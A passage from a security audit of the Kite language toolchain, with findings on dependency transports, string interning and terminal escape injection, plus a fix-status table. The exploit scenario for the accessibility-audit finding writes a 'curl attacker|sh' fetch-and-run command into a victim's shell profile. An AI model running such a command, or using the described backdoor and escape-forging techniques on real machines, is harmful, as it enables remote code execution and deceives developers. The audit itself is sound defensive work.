**Exploit scenario.** An attacker sends a Kite UI file for accessibility review. It contains `use std/fs` and, in `fn main()`, `fs.write("/home/victim/.zshrc", "curl attacker|sh")` before any drawing call. The reviewer runs `kitec check --a11y app.kite`; `audit_a11y` compiles the file and calls `result.run(...)`, which attaches `NativeHost`, so `fs.write_text` resolves to `std::fs::write` and the shell profile is overwritten. `kitec test` on the same file would have been harmless, because `run_function` passes `host: None`.

**Preconditions.**
- The user runs `kitec check --a11y` on a `.kite` file or project they did not write
- The file declares `fn main` (otherwise the audit refuses)

**Fix.** Run the audited program with `host: None` (as `run_test` already does) or with an audit-only host that implements nothing but the drawing/semantics namespace, so a transcript can be collected without granting filesystem authority; and state in `USAGE` that `--a11y` executes the program.

**Verification.** 2/3 lens verifiers confirmed.

### F19 — Dependency fetch allows cleartext `http://` and unauthenticated `git://` transports, and explicitly enables them in git (MEDIUM, confidence medium)

**Impact.** An on-path attacker (or anyone who can spoof DNS/ARP for the named host) can serve arbitrary repository contents for such a dependency. The fetched `.kite` files are compiled into the user's program and executed by `kitec run`/`kitec test`, so this is remote code execution against the developer or CI machine. Because a transitive manifest can name an `http://`/`git://` URL for its own dependency, the root package's author never opts into the insecure transport and cannot forbid it.

**Where.** `bin/kitec/src/pkg.rs:624` in `check_url`

**What.** A dependency URL taken from a manifest that, as this file's own history notes, "a dependency's dependency wrote" is accepted with the `http://` and `git://` schemes and then handed to `git clone` with those protocols force-enabled; both carry no transport authentication or integrity, and there is no signature check anywhere over the fetched source.

**Exploit scenario.** A transitive dependency's `kite.toml` declares `helper = { git = "git://build.example.internal/helper", version = "^1" }`. `check_url` accepts it, `hardened` sets `protocol.git.allow=always`, and `git ls-remote`/`git clone` speak the unauthenticated git daemon protocol. An attacker on the same network answers instead of the real host and returns a tree whose `src/lib.kite` contains a backdoor; the lockfile records only a name, a version, a source string and an FNV digest of whatever was received, so nothing detects the substitution.

**Preconditions.**
- A direct or transitive dependency is declared with an `http://` or `git://` URL
- The attacker holds an on-path/network-spoofing position between the build machine and that host
- `kitec pkg` is run without `--offline`

**Fix.** Drop `http://` and `git://` from the accepted schemes (or require an explicit opt-in flag per URL) and remove `protocol.http.allow=always` / `protocol.git.allow=always` from `hardened`; pin dependencies by commit id, or verify a cryptographic digest recorded in the lockfile, so transport compromise cannot change the bytes that get compiled.

**Verification.** 2/3 lens verifiers confirmed.

### F20 — Every string a program derives is interned into an append-only table and never released (MEDIUM, confidence medium)

**Impact.** Memory grows without bound in proportion to the distinct strings an attacker can induce. std's own character-at-a-time builders make it superlinear: `std/json.kite:174` (`out = out + c` in `parse_string`) interns every prefix of a decoded string, so one n-character JSON string value retains n distinct strings totalling n²/2 characters, permanently. A long-running Kite server on the web/Node target is driven to OOM by ordinary traffic.

**Where.** `crates/kite-codegen-wasm/src/glue.rs:117` in `intern`

**What.** In the default `Strings::Table` representation every `str` a Kite program produces — concatenation, slice, trim, interpolation, and every string read back from the host — goes through `intern`, which appends to `STRINGS` and `INDEX`; grepping the whole file shows no removal, eviction or reference counting, so the table is a monotonically growing root that the JS collector can never reclaim.

**Exploit scenario.** A Kite HTTP service parses each request body with `json.parse`. An attacker sends bodies containing a 100 KB string value; each request permanently retains roughly 5×10^9 characters worth of interned prefixes, and the process is out of memory within a handful of requests.

**Preconditions.**
- web/Wasm target built without `--js-strings` (the default string representation)
- A resident program — a server or a page — rather than a short-lived script

**Fix.** Make the table reclaimable — hold entries in a `FinalizationRegistry`-backed map or move the web target to the JS String Builtins representation (already implemented as `Strings::Builtins`) by default — and change std's character-at-a-time string builders (`json.parse_string`, `prelude.mapped`, `prelude.debug_str`, `fs.split_lines`) to accumulate into a slice and join once.

**Verification.** 2/3 lens verifiers confirmed.

### F21 — Diagnostic renderer echoes raw source lines to the terminal, allowing ANSI/OSC escape injection from a hostile .kite file (LOW, confidence high)

**Impact.** An attacker who controls a `.kite` file that a developer compiles (a vendored git dependency read by `crates/kite-driver/src/modules.rs:258`, an attached repro file, a contributor's branch) controls bytes written to the developer's terminal. Embedded carriage-return and CSI sequences let the rendered snippet and the surrounding diagnostics be overwritten or hidden — e.g. making a failing check appear to print nothing — and on terminals that honour OSC 52 the same bytes can write the system clipboard. The LSP path is unaffected (`crates/kite-lsp/src/json.rs:119` escapes control characters), so the exposure is the CLI.

**Where.** `crates/kite-diag/src/render.rs:139` in `print_source_line`

**What.** `file.line_text(line)` returns the untrusted source line verbatim (only trailing newline and carriage return are trimmed, see `crates/kite-span/src/lib.rs:112`) and it is written straight into the diagnostic string that `kitec` sends to stderr with `eprint!` (`bin/kitec/src/main.rs:238`); no pass anywhere between the lexer and the terminal neutralises C0/ESC/CSI/OSC bytes, and the lexer itself interpolates the raw character into a message at `crates/kite-lexer/src/lib.rs:544` (`format!("invalid character `{}` in source", ch)`).

**Exploit scenario.** A malicious package published as a Kite git dependency contains `lib.kite` with a line holding an ESC-CSI erase-line sequence followed by a carriage return and fabricated text, plus a construct that guarantees a diagnostic anchored on that line. When the victim runs `kitec build`, `render_diagnostics()` writes the line verbatim to stderr; the escape clears and rewrites the rendered output so the attacker's forged text — for example a clean "no errors" summary — is what the developer sees, while the real diagnostics are erased from the display.

**Preconditions.**
- The victim runs `kitec check`/`run`/`build` (or `kitec pkg` followed by a build) over a file whose contents the attacker chose
- Output goes to a terminal emulator that interprets ANSI/OSC escape sequences (the default)

**Fix.** Neutralise control characters at the rendering boundary: in `print_source_line`, `place`, and when interpolating source-derived text into a message, replace every character in the C0/C1 ranges (and DEL) with a visible escape — the same treatment `kite-lsp`'s `write_string` already applies — before writing it into the diagnostic buffer.

**Verification.** 3/3 lens verifiers confirmed.

## What was verified

The scan mapped the repository into 11 components, built a threat model for each, and dispatched 43 researchers across component × category cells plus a breadth sweep. They raised 86 candidates, 74 after deduplication. Each candidate that reached the panel was challenged by three independent verifiers working from different lenses, casting 135 votes in total; a candidate needed at least two of three to survive, and the 12 findings above that carry a unanimous 3/3 are the only ones allowed to claim high confidence — the 2/3 survivors are recorded at medium regardless of how certain the researcher was. Candidates the panel rejected are not in this report.

Every finding here is derived from **reading** the code. The scan executed nothing: no tests were run, no exploit was fired, no proof-of-concept was validated. The one exception is noted inline on F6, where this session separately reproduced the parser stack overflow by running `kitec check` on a generated input — that reproduction happened outside the scan pipeline and is labelled as such.

Two limits belong in your reading of this report. First, **29 candidate sites were never verified** because the panel hit its cap — they are neither confirmed findings nor cleared code. Second, F7 and F10 are the same underlying defect in `split_interpolation`/`span_text` found twice along different paths; treat them as one fix, not two.

The renderer stamps the verification status independently from this vote record; read it from the stamp file rather than from this section.

---

# Fix status — 2026-08-07

Applied to the working tree at `9028c68` and verified: `cargo test --workspace`, 58 suites, 786 tests, 0 failures.

| Finding | State | Verified by |
|---|---|---|
| F1 alias hijack | fixed | aliases keyed by declaring module; PoC now gets the real `std/math` while the dependency keeps its own alias |
| F2 json exponent loop | fixed | trip count clamped to the float range; regression test |
| F3 json exponent overflow | fixed | accumulation capped; regression test |
| F4 lexer interpolation recursion | fixed | 60k-deep `"\(` file reports E0006 instead of aborting |
| F5 vite plugin path read | fixed | glue ids confined to the cache dir; traversal and prefix cases rejected |
| F6 parser recursion | fixed | 50k nested parens exit 1 (E0102), previously exit 134 SIGABRT |
| F7 / F10 interpolation span | fixed | one defect; closing delimiter no longer assumed, `span_text` clamped |
| F8 server body / request leak | fixed | 20 MB POST answered 413; `REQUESTS` released on answer |
| F9 lockfile not verified | fixed | a changed lockfile is now a non-zero exit, `--update` to accept |
| F11 quadratic json | fixed | 200x200 KB echo: >300 s to 3.3 s |
| F12 toml int overflow | fixed | returns a parse error; regression test |
| F13 toml exponent loop | fixed | clamped; regression test |
| F14 kitec doc panic | fixed | `u32::MAX` sentinel replaced; comment-only files document cleanly |
| F15 release frame pointers | fixed | flag restored, and `kite-rt/build.rs` now refuses to build without it |
| F16 json nesting depth | fixed | ceiling of 128; regression tests either side |
| F17 std namespace squat | fixed | E0403; a user module may not take a std name |
| F18 a11y native host | fixed | audited program runs with no host; `fs.write` refused, no file created |
| F19 cleartext transports | fixed | `http://` and `git://` refused and no longer force-enabled in git |
| F21 ANSI injection | fixed | control characters escaped at the render boundary |
| markdown href escaping | fixed | scheme allowlist and attribute escaping (found by the Fable 5 consult) |
| **F20 unbounded interning** | **not fixed** | see below |

## F20 is still open, deliberately

The append-only `STRINGS` table in `kite-codegen-wasm/src/glue.rs` is not reclaimable, and it is the remaining reason a long-running server dies: after F8 and F11 were fixed, 200 requests of 200 KB still drove Node to `FATAL ERROR: Reached heap limit` at ~1.9 GB, now in 3.7 s rather than 360 s.

It is not fixable in that file. A `str` crosses to WebAssembly as an integer index, so the JS collector cannot know when the module has dropped one — which is exactly why the table only grows. A `FinalizationRegistry` does not help, because nothing on the wasm side holds a JS object to finalise.

The real fix already exists: `Strings::Builtins`, where a `str` *is* a JavaScript string and is collected normally. Making it the web target's default would close this. That is a compatibility decision rather than a security one — it does not instantiate on an engine without the JS String Builtins proposal — so it is left for the maintainer to make.
